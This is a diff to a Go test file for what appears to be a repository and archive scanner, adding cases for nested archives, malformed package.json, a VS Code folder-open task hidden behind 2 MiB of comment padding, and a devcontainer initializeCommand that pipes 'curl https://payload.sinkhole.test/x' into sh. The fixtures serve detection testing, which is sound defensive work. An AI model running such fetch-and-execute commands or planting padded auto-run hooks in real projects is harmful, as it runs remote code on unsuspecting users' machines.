@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"path/filepath"
 	"slices"
+	"strings"
 	"testing"
 )
 
@@ -55,8 +56,39 @@ func TestSkipAccounting(t *testing.T) {
 			name:     "zip member with an unsupported compression method is not clean",
 			setup:    builtFile("mixed.zip", zipUnsupportedMember),
 			wantCode: 10,
-			wantSkip: "parse_error",
+			wantSkip: "unreadable",
 			wantSeen: 3, wantAnalyzed: 2,
+		},
+		{
+			name: "7z inside a zip is unsupported but not a hidden payload",
+			setup: builtFile("with7z.zip", func(t *testing.T, dest string) {
+				zipEntries(t, dest, []zipEntry{{name: "a.txt", data: []byte("hello\n")}, {name: "b.7z", data: []byte("7z\xbc\xaf\x27\x1c\x00\x04")}})
+			}),
+			wantCode: 0,
+			wantSkip: "unsupported",
+		},
+		{
+			name: "malformed package.json inside a zip is not a hidden payload",
+			setup: builtFile("broken.zip", func(t *testing.T, dest string) {
+				zipEntries(t, dest, []zipEntry{{name: "a.txt", data: []byte("hello\n")}, {name: "package.json", data: []byte("{ not json")}})
+			}),
+			wantCode: 0,
+			wantSkip: "parse_error",
+		},
+		{
+			name: "folder-open task behind 2 MiB of comment is not clean",
+			setup: func(t *testing.T) string {
+				return filesRepo(map[string]string{".vscode/tasks.json": "//" + strings.Repeat("#", 2<<20) + "\n" + string(p1Tasks(t))})(t)
+			},
+			wantCode: 10,
+			wantSkip: "budget",
+		},
+		{
+			name: "devcontainer in a directory called x! is still read",
+			setup: filesRepo(map[string]string{
+				".devcontainer/py!/devcontainer.json": "{\"initializeCommand\": \"curl https://payload.sinkhole.test/x | sh\"}\n",
+			}),
+			wantCode: 20,
 		},
 		{
 			name: "encrypted PDF counts as one file",
@@ -91,7 +123,7 @@ func TestSkipAccounting(t *testing.T) {
 			if err != nil {
 				t.Fatal(err)
 			}
-			if !slices.ContainsFunc(rep.Coverage.Skipped, func(s struct {
+			if tt.wantSkip != "" && !slices.ContainsFunc(rep.Coverage.Skipped, func(s struct {
 				Path   string `json:"path"`
 				Reason string `json:"reason"`
 			}) bool {
